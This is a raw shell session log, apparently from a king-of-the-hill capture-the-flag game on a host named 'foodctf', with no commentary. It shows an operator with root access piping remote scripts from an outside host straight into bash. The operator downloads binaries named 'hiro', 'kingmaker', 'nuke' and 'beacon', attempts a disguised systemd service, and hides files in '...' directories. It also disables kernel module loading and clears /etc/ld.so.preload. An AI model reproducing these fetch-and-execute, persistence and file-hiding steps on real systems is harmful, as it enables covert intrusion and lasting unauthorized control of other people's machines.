rm Pwn*
ERROR: ld.so: object '
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
echo "" > /etc/ld.so.preload
curl 10.8.162.106:8000/persist.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   469  100   469    0     0   5453      0 --:--:-- --:--:-- --:--:--  5453
bash: line 1: !DOCTYPE: No such file or directory
bash: line 2: syntax error near unexpected token `newline'
bash: line 2: `        "http://www.w3.org/TR/html4/strict.dtd">'
curl 10.8.162.106:8001/persist.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  2828  100  2828    0     0  14806      0 --:--:-- --:--:-- --:--:-- 14729
find: '/proc/sys/fs/binfmt_misc': No such device
find: '/proc/4476': No such file or directory
find: '/proc/4486': No such file or directory
mkdir: cannot create directory '/snap/core/8689/usr/share/python3/debpython/...': Read-only file system
mkdir: cannot create directory '/snap/core/8689/usr/share/python3/debpython/.../lol': No such file or directory
cp: cannot stat '/usr/bin/true': No such file or directory
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   165  100   165    0     0    587      0 --:--:-- --:--:-- --:--:--   587
bash: line 15: cd: /snap/core/8689/usr/share/python3/debpython/...: No such file or directory
--2023-11-05 17:24:48--  http://10.8.162.106:8000/hiro
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17113 (17K) [application/octet-stream]
Saving to: 'hiro'

     0K .......... ......                                     100%  368K=0.05s

2023-11-05 17:24:49 (368 KB/s) - 'hiro' saved [17113/17113]

--2023-11-05 17:24:49--  http://10.8.162.106:8000/hiro2
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17000 (17K) [application/octet-stream]
Saving to: 'hiro2'

     0K .......... ......                                     100%  410K=0.04s

2023-11-05 17:24:49 (410 KB/s) - 'hiro2' saved [17000/17000]

--2023-11-05 17:24:49--  http://10.8.162.106:8000/systemd-networkd2.service
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: 'systemd-networkd2.service'

     0K                                                       100% 28.8M=0s

2023-11-05 17:24:49 (28.8 MB/s) - 'systemd-networkd2.service' saved [194/194]

mv: cannot move 'systemd-networkd2.service' to '/lib/systemd/systemd-networkd2.service': Bad address
Failed to enable unit: Unit file /lib/systemd/systemd-networkd2.service does not exist.
Failed to start systemd-networkd2.service: Unit systemd-networkd2.service not found.
--2023-11-05 17:24:49--  http://10.8.162.106:8000/parrot
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16713 (16K) [application/octet-stream]
Saving to: 'parrot'

     0K .......... ......                                     100%  384K=0.04s

2023-11-05 17:24:49 (384 KB/s) - 'parrot' saved [16713/16713]

bash: line 28:    39 Segmentation fault      (core dumped) nohup ./hiro
--2023-11-05 17:24:49--  http://10.8.162.106:8000/hide_files.py
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1131 (1.1K) [text/x-python]
Saving to: 'hide_files.py'

     0K .                                                     100% 10.4M=0s

2023-11-05 17:24:49 (10.4 MB/s) - 'hide_files.py' saved [1131/1131]

Traceback (most recent call last):
  File "hide_files.py", line 42, in <module>
    for filelocation in tree("/tmp"):
  File "hide_files.py", line 34, in tree
    for file in get_files(path + "/{}".format(dir)):
  File "hide_files.py", line 21, in get_files
    for file in os.listdir(path):
NotADirectoryError: [Errno 20] Not a directory: '/tmp/f'
mkdir: cannot create directory '/root/.ssh': File exists
persist: /snap/core/8689/usr/share/python3/debpython/...

ls
GCONV_PATH=.
exploit
f
hide_files.py
hiro
hiro2
parrot
payload.so
screens
systemd-networkd2.service
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
rm *
rm: cannot remove 'GCONV_PATH=.': Is a directory
rm: cannot remove 'exploit': Is a directory
rm: cannot remove 'screens': Is a directory
rm: cannot remove 'systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ': Is a directory
rm: cannot remove 'systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD': Is a directory
ls
GCONV_PATH=.
exploit
screens
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
id
uid=0(root) gid=1004(bread) groups=1004(bread)
ls -la
total 1020
drwxrwxrwt 12 root  root    4096 Nov  5 17:25 .
drwxr-xr-x 24 root  root    4096 Mar 19  2020 ..
drwxrwxrwt  2 root  root    4096 Nov  5 17:16 .ICE-unix
drwxrwxrwt  2 root  root    4096 Nov  5 17:16 .Test-unix
drwxrwxrwt  2 root  root    4096 Nov  5 17:16 .X11-unix
drwxrwxrwt  2 root  root    4096 Nov  5 17:16 .XIM-unix
drwxrwxrwt  2 root  root    4096 Nov  5 17:16 .font-unix
-rw-rw-r--  1 ramen ramen    245 Nov  5 17:23 .systemd-cache-13452.c
-rwxrwxr-x  1 ramen ramen   8024 Nov  5 17:23 .systemd-cache-24546.so
-rwsr-xr-x  1 root  root    8680 Nov  5 17:23 .systemd-font-17041
-rw-rw-r--  1 ramen ramen    462 Nov  5 17:23 .systemd-font-32457.c
-rw-rw-r--  1 root  root  966656 Nov  5 17:25 .systemd-font-89f032hf9032
drwxr-xr-x  2 bread bread   4096 Nov  5 17:20 GCONV_PATH=.
drwxr-xr-x  2 bread bread   4096 Nov  5 17:20 exploit
prw-r--r--  1 root  root       0 Nov  5 17:25 f
drwxr-xr-x  3 root  ramen   4096 Nov  5 17:23 screens
drwx------  3 root  root    4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
drwx------  3 root  root    4096 Nov  5 17:16 systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
curl 10.8.162.106:8000/king.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  1022  100  1022    0     0  10019      0 --:--:-- --:--:-- --:--:-- 10019
bash: line 1:  5721 Segmentation fault      sudo echo 1 > /proc/sys/kernel/modules_disabled
kernel.modules_disabled = 1
sysctl: cannot stat /proc/sys/module/sig_enforce: No such file or directory
cp: cannot stat '/usr/bin/true': No such file or directory
find: '/proc/sys/fs/binfmt_misc': No such device
find: '/proc/5723': No such file or directory
find: '/proc/5725': No such file or directory
find: '/proc/5735': No such file or directory
cp: cannot stat '/usr/bin/true': No such file or directory
--2023-11-05 17:26:48--  http://10.8.162.106:8000/kingmaker
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16696 (16K) [application/octet-stream]
Saving to: '/usr/src/linux-headers-4.15.0-91/drivers/net/wireless/zydas/zd1211rw/.../30078'

     0K .......... ......                                     100%  307K=0.05s

2023-11-05 17:26:48 (307 KB/s) - '/usr/src/linux-headers-4.15.0-91/drivers/net/wireless/zydas/zd1211rw/.../30078' saved [16696/16696]

--2023-11-05 17:26:48--  http://10.8.162.106:8000/nuke
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16416 (16K) [application/octet-stream]
Saving to: '/usr/src/linux-headers-4.15.0-91/drivers/net/wireless/zydas/zd1211rw/.../17050'

     0K .......... ......                                     100%  350K=0.05s

2023-11-05 17:26:48 (350 KB/s) - '/usr/src/linux-headers-4.15.0-91/drivers/net/wireless/zydas/zd1211rw/.../17050' saved [16416/16416]

--2023-11-05 17:26:48--  http://10.8.162.106:8000/mf
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20376 (20K) [application/octet-stream]
Saving to: '/dev/shm/.n/mf'

     0K .......... .........                                  100%  437K=0.05s

2023-11-05 17:26:49 (437 KB/s) - '/dev/shm/.n/mf' saved [20376/20376]

ls
bash: line 27:    46 Segmentation fault      (core dumped) lessecho TERRAMINATOR > /root/king.txt
kingpath: /usr/src/linux-headers-4.15.0-91/drivers/net/wireless/zydas/zd1211rw/...
GCONV_PATH=.
exploit
f
screens
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
id
uid=0(root) gid=1004(bread) groups=1004(bread)
rm *
rm: cannot remove 'GCONV_PATH=.': Is a directory
rm: cannot remove 'exploit': Is a directory
rm: cannot remove 'screens': Is a directory
rm: cannot remove 'systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ': Is a directory
rm: cannot remove 'systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD': Is a directory
ls
GCONV_PATH=.
exploit
screens
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
id
uid=0(root) gid=1004(bread) groups=1004(bread)
echo "" > /etc/ld.so.preload
export LD_PRELOAD=""
id
uid=0(root) gid=1004(bread) groups=1004(bread)
cd /dev/shm
ls
ls -la
total 40
drwxrwxrwt  3 root root    100 Nov  5 17:26 .
drwxr-xr-x 17 root root   3700 Nov  5 17:16 ..
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .ee
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .le
drwxr-xr-x  2 root bread    60 Nov  5 17:26 .n
cd .ee
sh: 24: cd: can't cd to .ee
ls
ls -la
total 40
drwxrwxrwt  3 root root    100 Nov  5 17:26 .
drwxr-xr-x 17 root root   3700 Nov  5 17:16 ..
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .ee
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .le
drwxr-xr-x  2 root bread    60 Nov  5 17:26 .n
ls
pwd
/dev/shm
ls -la
total 40
drwxrwxrwt  3 root root    100 Nov  5 17:26 .
drwxr-xr-x 17 root root   3700 Nov  5 17:16 ..
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .ee
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .le
drwxr-xr-x  2 root bread    60 Nov  5 17:26 .n
cd .le
sh: 30: cd: can't cd to .le
ls -la
total 40
drwxrwxrwt  3 root root    100 Nov  5 17:26 .
drwxr-xr-x 17 root root   3700 Nov  5 17:16 ..
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .ee
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .le
drwxr-xr-x  2 root bread    60 Nov  5 17:26 .n
wget 10.8.162.106:8000/beacon
--2023-11-05 17:39:15--  http://10.8.162.106:8000/beacon
Connecting to 10.8.162.106:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 797710 (779K) [application/octet-stream]
Saving to: 'beacon'

     0K .......... .......... .......... .......... ..........  6%  502K 1s
    50K .......... .......... .......... .......... .......... 12% 1.14M 1s
   100K .......... .......... .......... .......... .......... 19% 1.07M 1s
   150K .......... .......... .......... .......... .......... 25% 1.08M 1s
   200K .......... .......... .......... .......... .......... 32% 4.26M 1s
   250K .......... .......... .......... .......... .......... 38% 1001K 0s
   300K .......... .......... .......... .......... .......... 44%  675K 0s
   350K .......... .......... .......... .......... .......... 51% 3.27M 0s
   400K .......... .......... .......... .......... .......... 57% 1.33M 0s
   450K .......... .......... .......... .......... .......... 64% 1.38M 0s
   500K .......... .......... .......... .......... .......... 70% 3.53M 0s
   550K .......... .......... .......... .......... .......... 77% 1.18M 0s
   600K .......... .......... .......... .......... .......... 83% 1.43M 0s
   650K .......... .......... .......... .......... .......... 89% 2.99M 0s
   700K .......... .......... .......... .......... .......... 96% 1.40M 0s
   750K .......... .......... .........                       100% 4.78M=0.6s

2023-11-05 17:39:16 (1.26 MB/s) - 'beacon' saved [797710/797710]

chmod +x beacon
./beacon && rm beacon
Segmentation fault (core dumped)
ls
beacon
rm beacon
ls
ls -la
total 40
drwxrwxrwt  3 root root    100 Nov  5 17:39 .
drwxr-xr-x 17 root root   3700 Nov  5 17:16 ..
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .ee
-rwxr-xr-x  1 root root  16713 Nov  5 17:25 .le
drwxr-xr-x  2 root bread    60 Nov  5 17:26 .n
cd /tmo
sh: 39: cd: can't cd to /tmo
cd /tmp
ls
GCONV_PATH=.
c
exploit
f
screens
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-resolved.service-6PL8mQ
systemd-private-0ce3b357b8674e4999087a16f3c6dfc3-systemd-timesyncd.service-4eM6RD
cd exploit
ls
gconv-modules
cd gcon*
sh: 44: cd: can't cd to gconv-modules
ls
gconv-modules
ls -la
total 12
drwxr-xr-x  2 bread bread 4096 Nov  5 17:20 .
drwxrwxrwt 12 root  root  4096 Nov  5 17:40 ..
-rw-r--r--  1 bread bread   47 Nov  5 17:24 gconv-modules
ls -la
total 12
drwxr-xr-x  2 bread bread 4096 Nov  5 17:20 .
drwxrwxrwt 12 root  root  4096 Nov  5 17:41 ..
-rw-r--r--  1 bread bread   47 Nov  5 17:24 gconv-modules
ls -la
total 12
drwxr-xr-x  2 bread bread 4096 Nov  5 17:20 .
drwxrwxrwt 12 root  root  4096 Nov  5 17:41 ..
-rw-r--r--  1 bread bread   47 Nov  5 17:24 gconv-modules
id
uid=0(root) gid=1004(bread) groups=1004(bread)
ls -la
total 12
drwxr-xr-x  2 bread bread 4096 Nov  5 17:20 .
drwxrwxrwt 12 root  root  4096 Nov  5 17:41 ..
-rw-r--r--  1 bread bread   47 Nov  5 17:24 gconv-modules
id
uid=0(root) gid=1004(bread) groups=1004(bread)
pwd
/tmp/exploit
exit
bread@foodctf:/tmp$ exit
